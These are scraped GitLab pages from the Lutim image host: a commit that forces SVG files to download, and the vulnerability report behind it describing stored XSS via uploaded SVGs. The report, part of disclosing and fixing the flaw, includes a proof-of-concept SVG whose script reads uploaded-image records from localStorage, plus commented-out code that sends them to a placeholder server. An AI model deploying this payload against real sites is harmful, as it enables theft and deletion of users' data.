=== Content from framagit.org_b0ab6787_20250124_163718.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Register](/users/sign_up)

Project 'luc/lutim' was moved to 'fiat-tux/hat-softwares/lutim'. Please update any links and bookmarks that may still have the old path.

**Commit
4c0df8f8**

authored
Feb 13, 2017
by
**[![Luc Didry's avatar](/uploads/-/system/user/avatar/2/avatar.png?width=48 "Luc Didry")](/luc)
[Luc Didry](/luc)**

[Browse files](/fiat-tux/hat-softwares/lutim/-/tree/4c0df8f8b10122339b908dcd9b1117348b49dcab)

### Force download if image is SVG

parent
[4629d2ae](/fiat-tux/hat-softwares/lutim/-/commit/4629d2ae2d7d530493a202614b12d1b78525af82)

Loading

Loading

Loading

* [Changes
  1](/fiat-tux/hat-softwares/lutim/-/commit/4c0df8f8b10122339b908dcd9b1117348b49dcab)

[Hide whitespace changes](/fiat-tux/hat-softwares/lutim/-/commit/4c0df8f8b10122339b908dcd9b1117348b49dcab?action=show&controller=projects%2Fcommit&id=4c0df8f8b10122339b908dcd9b1117348b49dcab&namespace_id=fiat-tux%2Fhat-softwares&project_id=lutim&w=1)
[Inline](/fiat-tux/hat-softwares/lutim/-/commit/4c0df8f8b10122339b908dcd9b1117348b49dcab?view=inline)
[Side-by-side](/fiat-tux/hat-softwares/lutim/-/commit/4c0df8f8b10122339b908dcd9b1117348b49dcab?view=parallel)

Loading

* [Framartin](/martin.gubri)
  @martin.gubri

  mentioned in issue [#38 (closed)](/fiat-tux/hat-softwares/lutim/-/issues/38 "XSS vulnerability using SVG image")

  Â·

  [Feb 27, 2017](#note_65728)

  mentioned in issue [#38 (closed)](/fiat-tux/hat-softwares/lutim/-/issues/38 "XSS vulnerability using SVG image")

  mentioned in issue #38

  Toggle commit list

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from framagit.org_2b98651a_20250124_163719.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Register](/users/sign_up)

Project 'luc/lutim' was moved to 'fiat-tux/hat-softwares/lutim'. Please update any links and bookmarks that may still have the old path.

# XSS vulnerability using SVG image

Lutim is vulnerable to an XSS attack using the ability of SVG to contain Javascript. This is particularly severe because the data of uploaded images are stored on localStorage.

Here is possible exploit for it:

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    var files = JSON.parse(localStorage.getItem('images'));
    // var server = "https://myserver.com?url="
    files.forEach(function(element, index, array) {
        var filename = element.filename ;
        var url = element.short+'.'+element.ext ;
        alert(filename+' at URL: https://framapic.org/'+url) ;
        // var xmlHttp = new XMLHttpRequest();
        // xmlHttp.open("GET", server+url, false);
        // xmlHttp.send(null);
    });
  </script>
</svg>
```

How to:

* someone open a malicious svg in the browser
* as the svg file is hosted on the same domain name, it has access to localStorage data
* an attacker can read the following elements for all the uploaded images by the target: filename, view url, url to delete the image, send date, expire date
* then an attacker can send all the data on a remote server, or simply delete all the images of the target hosted on Lutim

Possible workarounds:

* disable svg upload
* disable the viewing of svg and force download
* filter svg files (very complicated!)
* convert svg into a bitmap format
* disable localStorage (which will leave possible other XSS)

Source: <https://www.grepular.com/Scalable_Vector_Graphics_and_XSS>

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


